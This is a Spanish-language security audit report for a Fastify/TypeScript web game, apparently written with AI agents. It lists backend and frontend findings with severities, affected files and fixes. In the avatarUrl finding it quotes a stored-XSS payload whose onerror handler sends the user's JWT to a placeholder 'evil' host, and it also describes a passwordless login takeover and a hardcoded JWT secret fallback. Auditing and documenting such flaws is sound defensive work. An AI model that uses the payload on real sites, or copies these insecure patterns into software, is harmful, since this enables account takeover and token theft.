# Auditoría de seguridad — Transcendence Pokémon Edition

> Fecha: 2026-07-05 · Alcance: `services/game-service/` (backend Fastify + SQLite),
> `services/frontend/` (SPA TS + Tailwind) y `packages/shared/`.
> Metodología: revisión estática con 2 agentes en paralelo (backend y frontend).
> Estado de remediación: ver columna en cada tabla y `REFACTOR_PLAN.md`.

## Resumen ejecutivo

El manejo de SQL es sólido (todo parametrizado, sin inyección) y la validación de
esquemas Fastify está bien aplicada. El servidor es autoritativo de verdad: el
cliente no calcula reglas de combate/daño/compras, solo envía intenciones y renderiza.

Los problemas graves eran dos cadenas de apropiación de cuenta:

1. **Backend:** login *passwordless* (solo email) + secreto JWT público y con
   fallback hardcodeado + IDs de usuario derivados del email (predecibles).
2. **Frontend:** XSS almacenado vía `avatarUrl` + JWT en `localStorage` + ausencia
   total de CSP.

## Hallazgos backend

| ID | Sev. | Título | Archivo | Estado |
|----|------|--------|---------|--------|
| C1 | CRÍTICA | Login sin contraseña: suplantación total de cuentas | `controllers/AuthController.ts:47-60` | Corregido |
| C2 | CRÍTICA | Secreto JWT con fallback inseguro y hardcodeado | `auth/jwt.ts:11` | Corregido |
| A1 | ALTA | Enumeración de usuarios + IDs predecibles | `AuthController.ts:14-16,54-58` | Corregido |
| M1 | MEDIA | Partida "local" singleton global mutable por cualquiera | `controllers/GameController.ts`, `routes/ws.routes.ts` | Mitigado |
| M2 | MEDIA | Sin rate limiting (HTTP ni WS) | `app.ts`, `routes/ws.routes.ts` | Documentado |
| M3 | MEDIA | Token de sesión en la URL (query WS + redirect OAuth) | `AuthController.ts:103`, `ws.routes.ts:56-60` | Corregido |
| M4 | MEDIA | Apertura de DM sin comprobar amistad | `ws.routes.ts:66-77` | Corregido |
| B1 | BAJA | JWT sin algoritmo fijado, sin `aud`/`iss`, exp. 7d, sin revocación | `auth/jwt.ts` | Corregido |
| B2 | BAJA | Vault no integrado; secretos solo desde `process.env` | `app.ts`, `auth/jwt.ts` | Documentado |
| B3 | BAJA | Sin validación de `Origin` en WS ni cabeceras de seguridad | `ws.routes.ts:54`, `app.ts` | Mitigado (CSP en gateway) |

### C1 — Login sin contraseña
`login` solo comprobaba que existiera un usuario con ese email y emitía un JWT válido:
sin contraseña, 2FA ni verificación de posesión del email. El id era determinista
(`usr_` + base64(email)), reversible. Un atacante hacía `POST /api/auth/login
{"email":"victima@..."}` y obtenía sesión completa.
**Fix aplicado:** contraseña con hash (scrypt), IDs aleatorios (UUID), y andamiaje 2FA.

### C2 — Secreto JWT
`const SECRET = process.env.JWT_SECRET ?? 'dev-only-insecure-secret-change-me'`, con
el mismo valor commiteado en `.env`. Cualquiera que leyera el repo podía firmar
tokens. **Fix aplicado:** sin fallback; el arranque aborta si falta `JWT_SECRET`;
algoritmo fijado a HS256 con `aud`/`iss`.

## Hallazgos frontend

| ID | Sev. | Título | Archivo | Estado |
|----|------|--------|---------|--------|
| 1 | CRÍTICA | XSS almacenado vía `avatarUrl` en lista de amigos/búsqueda | `views/hub/CommunityMenuView.ts:96` | Corregido |
| 2 | ALTA | JWT en `localStorage` (robo trivial vía XSS) | `auth/AuthState.ts` | Corregido (cookie HttpOnly) |
| 3 | ALTA | Token en query string (WSS + callback OAuth) | `net/WsClient.ts:49`, `main.ts:39` | Corregido |
| 4 | MEDIA | Ausencia total de Content-Security-Policy | `index.html`, gateway | Corregido |
| 5 | MEDIA | XSS reflejado potencial en sinks `innerHTML` con datos de servidor | múltiples views | Corregido (escape unificado) |
| 6 | MEDIA | Dev server con anti DNS-rebinding desactivado | `vite.config.ts:13` | Documentado (solo dev) |
| 7 | BAJA | Recursos externos sin SRI; hosts hardcodeados | varios | Documentado |
| 8 | BAJA | `any` en modelo de usuario; reconexión WS sin backoff | `AuthState.ts:9`, `WsClient.ts:63` | Corregido |

### 1 — XSS almacenado vía `avatarUrl`
`spriteOf()` devolvía `avatarUrl` sin escapar, interpolado en `innerHTML` dentro del
`src` de un `<img>`. Un atacante fijaba su `avatarUrl` a
`x.png" onerror="fetch('https://evil/'+localStorage.token)` y, al verlo la víctima en
COMUNIDAD, se exfiltraba el JWT. **Fix aplicado:** `escapeAttr` unificado + validación
de `avatarUrl` contra whitelist en el servidor + JWT fuera de `localStorage`.

## Aspectos correctos (sin hallazgos)

- **Inyección SQL:** todas las consultas usan parámetros preparados (`?`).
- **Autorización online:** cada acción se ata al slot del dueño del token
  (identidad→slot), no al `currentPlayer` que diga el cliente.
- **Confianza en el cliente:** movimientos, combate, compras, draft y loot se
  resuelven en el servidor; las restricciones de UI son solo cosméticas.
- **Exposición de datos:** `toPublicUser` no filtra el email; errores genéricos sin
  stack traces al cliente.

## Pendiente (requiere decisión/infra)

- **M2 rate limiting:** registrar `@fastify/rate-limit` global + límite de payload/throttle WS.
- **B2 Vault:** cargar `JWT_SECRET`, `GOOGLE_CLIENT_*` desde HashiCorp Vault (tabla CLAUDE.md §2).
- **6/7 frontend:** auto-hospedar la fuente `Press Start 2P` y enrutar sprites/PokeAPI
  por `pokeapi-proxy` + Redis; añadir SRI a recursos externos irremplazables.
